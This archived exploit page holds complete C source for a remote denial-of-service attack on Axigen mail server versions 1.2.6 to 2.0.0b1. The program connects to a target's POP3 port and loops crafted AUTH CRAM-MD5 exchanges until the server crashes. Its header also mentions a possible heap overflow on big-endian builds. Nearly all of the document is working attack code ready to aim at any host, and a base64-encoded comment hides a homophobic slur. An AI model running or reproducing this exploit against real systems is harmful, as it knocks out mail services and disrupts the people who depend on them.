<html><head><title>Axigen <= 2.0.0b1 Remote Denial of Service Exploit </title></head><pre>/* doaxigen.c
 *
 * axigen 1.2.6 - 2.0.0b1 DoS (x86-lnx)
 * by mu-b - Sat Oct 22 2006
 *
 * - Tested on: AXIGEN 1.2.6 (lnx)
 *              AXIGEN 2.0.0b1 (lnx)
 *
 * 0x08088054: parsing error results in DoS (little-endian, confirmed)
 *                                      DoS + off-by-one heap smash (big-endian)
 *
 * Note: if you receive a SIGPIPE then you crashed the server
 *       but at too high a memory address... try again.
 */

/* dGFicyBhcmUgZm9yIGZhZ2dvdHNcIQ== */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/types.h&gt;

#define BUF_SIZE    1024
#define BBUF_SIZE   BUF_SIZE/3*4+1

#define AUTH_CMD    &quot;AUTH CRAM-MD5\r\n&quot;
#define QUIT_CMD    &quot;QUIT\r\n&quot;

#define DEF_PORT    110
#define PORT_POP3   DEF_PORT

#define RCNT_DELAY  3

static const char base64tab[] =
  &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;

static int base64 (const u_char * ibuf, u_char * obuf, size_t n);
static int sock_send (int sock, u_char * src, int len);
static int sock_recv (int sock, u_char * dst, int len);
static void zhammer (u_char * host);

static int
base64 (const u_char * ibuf, u_char * obuf, size_t n)
{
  int a, b, c;
  int i, j;
  int d, e, f, g;

  a = b = c = 0;
  for (j = i = 0; i &lt; n; i += 3)
    {
      a = (u_char) ibuf[i];
      b = i + 1 &lt; n ? (u_char) ibuf[i + 1] : 0;
      c = i + 2 &lt; n ? (u_char) ibuf[i + 2] : 0;

      d = base64tab[a &gt;&gt; 2];
      e = base64tab[((a &amp; 3) &lt;&lt; 4) | (b &gt;&gt; 4)];
      f = base64tab[((b &amp; 15) &lt;&lt; 2) | (c &gt;&gt; 6)];
      g = base64tab[c &amp; 63];

      if (i + 1 &gt;= n)
        f = '=';
      if (i + 2 &gt;= n)
        g = '=';

      obuf[j++] = d, obuf[j++] = e;
      obuf[j++] = f, obuf[j++] = g;
    }

  obuf[j++] = '\0';

  return strlen (obuf);
}

static int
sock_send (int sock, u_char * src, int len)
{
  int sbytes;

  sbytes = send (sock, src, len, 0);

  return (sbytes);
}

static int
sock_recv (int sock, u_char * dst, int len)
{
  int rbytes;

  rbytes = recv (sock, dst, len, 0);
  if (rbytes &gt;= 0)
    dst[rbytes] = '\0';

  return (rbytes);
}

static int
sockami (u_char * host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int sock;

  fflush (stdout);
  if ((sock = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror (&quot;socket()&quot;);
      exit (-1);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror (&quot;gethostbyname()&quot;);
      exit (-1);
    }

  memset (&amp;address, 0, sizeof (address));
  memcpy ((char *) &amp;address.sin_addr, hp-&gt;h_addr, hp-&gt;h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (sock, (struct sockaddr *) &amp;address, sizeof (address)) == -1)
    {
      perror (&quot;connect()&quot;);
      exit (EXIT_FAILURE);
    }

  return (sock);
}

static void
zhammer (u_char * host)
{
  int sock, rbytes;
  u_int i;
  u_char *md5 = &quot;\&quot; d339490346794f964736669ae26e29df&quot;;  /* what was that? */
  u_char sbuf[BBUF_SIZE], *sptr;
  u_char rbuf[BUF_SIZE];

  fd_set r_fds;
  struct timeval tv;

  base64 (md5, sbuf, strlen (md5));
  sptr = sbuf + strlen (sbuf);
  *sptr++ = '\r', *sptr++ = '\n', *sptr = '\0';

  printf (&quot;+Connecting to %s:%d.&quot;, host, PORT_POP3);
  sock = sockami (host, PORT_POP3);
  rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
  if (rbytes &lt; 0)
    return;

  for (i = 0; i &lt; -1; i++)
    {
      int rbytes;

      sock_send (sock, AUTH_CMD, strlen (AUTH_CMD));
      rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
      if (rbytes &lt; 0)
        break;

      sock_send (sock, sbuf, strlen (sbuf));

      FD_ZERO (&amp;r_fds);
      FD_SET (sock, &amp;r_fds);
      tv.tv_sec = 4;            /* wait 4 seconds */
      tv.tv_usec = 0;

      rbytes = select (sock + 1, &amp;r_fds, NULL, NULL, &amp;tv);
      if (rbytes == -1)         /* oh dear */
        perror (&quot;select()&quot;);
      else if (rbytes)          /* read response */
        rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
      else                      /* timeout, server appears to have crashed!@$%! */
        break;

      /* hmmm, too many attempts, must re-connect... */
      if (strstr (rbuf, &quot;(maximum number of protocol errors reached)&quot;))
        {
          close (sock);
          sleep (RCNT_DELAY);

          printf (&quot;\n+Reconnecting to %s:%d.&quot;, host, PORT_POP3);
          sock = sockami (host, PORT_POP3);
          rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
        }

      if (rbytes &lt; 0)
        break;

      if (!((i + 1) % 4))
        printf (&quot;..%d&quot;, i + 1);

      fflush (stdout);
      usleep (1000);
    }

  printf (&quot;\n&quot;);
}

int
main (int argc, char **argv)
{
  printf (&quot;axigen 1.2.6 - 2.0.0b1 DoS POC\n&quot;
          &quot;by: &lt;mu-b@digit-labs.org&gt;, &lt;mu-b@65535.com&gt;\n\n&quot;);

  if (argc &lt;= 1)
    {
      fprintf (stderr, &quot;Usage: %s &lt;host&gt;\n&quot;, argv[0]);
      exit (EXIT_SUCCESS);
    }

  zhammer (argv[1]);

  printf (&quot;+Wh00t!\n&quot;);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-02-08]</pre></html>